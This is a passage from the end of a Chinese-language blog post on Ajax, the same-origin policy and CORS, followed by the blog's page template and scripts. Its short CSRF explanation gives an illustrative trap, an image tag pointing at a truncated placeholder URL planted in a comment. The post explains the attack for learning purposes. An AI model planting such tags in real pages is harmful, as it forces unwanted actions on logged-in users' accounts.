+<p>CSRF:”跨站点请求伪造”攻击 是值攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。<br>案例情景： 1. 用户A认真了用户A身份，在网站上留下了Cookie           </p>
+<pre><code>2. 另一个人 留下评论&lt;img src=&quot;http://tongyige.com/.....&quot;&gt;          
+3. 用户A触发陷阱。。。            
+</code></pre><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
+<li>阮一峰 <a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="external">浏览器同源政策及其规避方法</a></li>
+<li>阮一峰 <a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="external">跨域资源共享 CORS 详解</a> </li>
+</ol>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/js/">js</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://lx15.github.io/2017/02/21/Ajax_Json_Jsonp/" data-title="原生Ajax使用实现、同源策略及CORS等跨域方案 | Lx15的博客" data-tsina="undefined" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2017/02/24/cookie&session/" title="Cookie、Session Cookie 、Cookie-Session 、Session及Storage">
+  <strong>上一篇：</strong><br/>
+  <span>
+  Cookie、Session Cookie 、Cookie-Session 、Session及Storage</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2017/02/08/Javascript模块化编程/"  title="Javascript模块化编程">
+ <strong>下一篇：</strong><br/> 
+ <span>Javascript模块化编程
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2017/02/21/Ajax_Json_Jsonp/" data-title="原生Ajax使用实现、同源策略及CORS等跨域方案" data-url="http://lx15.github.io/2017/02/21/Ajax_Json_Jsonp/"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ajax-基础知识"><span class="toc-number">1.</span> <span class="toc-text">Ajax 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XHR基本用法"><span class="toc-number">1.1.</span> <span class="toc-text">XHR基本用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XHR操作Http请求头部与响应头部的方法"><span class="toc-number">1.2.</span> <span class="toc-text">XHR操作Http请求头部与响应头部的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XHR-2级"><span class="toc-number">1.3.</span> <span class="toc-text">XHR 2级</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FormData-类型"><span class="toc-number">1.3.1.</span> <span class="toc-text">FormData 类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#overrideMimeType"><span class="toc-number">1.3.2.</span> <span class="toc-text">overrideMimeType()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#进度事件"><span class="toc-number">1.3.3.</span> <span class="toc-text">进度事件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ajax-原生使用及Jsonp实现"><span class="toc-number">2.</span> <span class="toc-text">Ajax 原生使用及Jsonp实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ajax-解决浏览器的缓存方案"><span class="toc-number">3.</span> <span class="toc-text">Ajax 解决浏览器的缓存方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#同源策略"><span class="toc-number">4.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#规避同源策略（跨域方案）"><span class="toc-number">5.</span> <span class="toc-text">规避同源策略（跨域方案）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#图像Ping"><span class="toc-number">5.1.</span> <span class="toc-text">图像Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonp"><span class="toc-number">5.2.</span> <span class="toc-text">jsonp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebSocket"><span class="toc-number">5.3.</span> <span class="toc-text">WebSocket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#window-postMessage"><span class="toc-number">5.4.</span> <span class="toc-text">window.postMessage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS"><span class="toc-number">5.5.</span> <span class="toc-text">CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简单请求"><span class="toc-number">5.5.1.</span> <span class="toc-text">简单请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#非简单请求"><span class="toc-number">5.5.2.</span> <span class="toc-text">非简单请求</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-与CSRF"><span class="toc-number">6.</span> <span class="toc-text">XSS 与CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-number">7.</span> <span class="toc-text">参考文献</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github 名片</p>
+<div class="github-card" data-github="https://github.com/Lx15" data-width="220" data-height="119" data-theme="medium">
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
+</div>
+  </div>
+
+
+
+  
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/js/" title="js">js<sup>29</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/css/" title="css">css<sup>10</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ng/" title="ng">ng<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ES6/" title="ES6">ES6<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/html5/" title="html5">html5<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/algo/" title="algo">algo<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/util/" title="util">util<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/weex/" title="weex">weex<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/nodejs/" title="nodejs">nodejs<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Cesium/" title="Cesium">Cesium<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C/" title="C">C<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/git/" title="git">git<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/seo/" title="seo">seo<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/工具集/" title="工具集">工具集<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/this/" title="this">this<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/h5/" title="h5">h5<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/web/" title="web">web<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/DOM/" title="DOM">DOM<sup>1</sup></a></li>
+			
+		
+			
+		
+		</ul>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m Liu Xin. <br/>
+			Be happier,Be Braver.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/https://github.com/Lx15" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:938266124@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2017 
+		
+		<a href="/about" target="_blank" title="Lx15">Lx15</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"lx15"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
